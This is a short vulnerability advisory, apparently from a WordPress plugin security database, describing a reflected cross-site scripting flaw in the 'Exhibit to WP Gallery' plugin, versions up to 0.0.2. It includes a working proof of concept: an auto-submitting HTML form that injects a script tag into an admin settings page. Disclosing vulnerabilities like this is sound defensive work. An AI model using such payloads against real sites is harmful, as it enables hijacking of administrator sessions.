## WordPress Plugin Vulnerabilities

# Exhibit to WP Gallery <= 0.0.2 - Reflected XSS

### Description

The plugin does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against high privilege users such as admin.

### Proof of Concept

Have an admin open an HTML file containing:
```
<body onload="document.forms[0].submit()">
<form action="https://example.com/wp-admin/options-general.php?page=exhibit-to-wp-gallery%2Fexhibit-to-wp-gallery.php" method="post">
<input type="hidden" name="beginfromid" value='hacked"><script>alert(1232)</script>' />
<input type="submit" value="Send"/>
</form>
</body>
```
